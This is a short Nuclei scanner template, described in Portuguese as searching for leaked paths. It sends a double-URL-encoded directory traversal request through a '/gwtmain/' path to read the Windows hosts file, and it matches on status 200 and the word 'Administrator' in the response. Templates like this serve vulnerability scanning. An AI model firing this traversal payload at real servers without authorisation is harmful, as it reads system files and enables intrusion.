id: kaue-path-t

info:
  name: kauepath-t
  author: kauenavarro
  severity: medium
  description: Procura caminhos vazados 

requests:
  - method: GET
    path:
      - "{{BaseURL}}/gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts"
    
    redirects: true
    max-redirects: 1
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Administrator"
        part: body
        condition: or

      - type: word
        words:
          - "text/html"
        part: header

      - type: word
        words:
          - "<title>Access Denied</title>"
          - "You don't have permission to access"
        part: body
        condition: and
        negative: true

      - type: status
        status:
          - 200
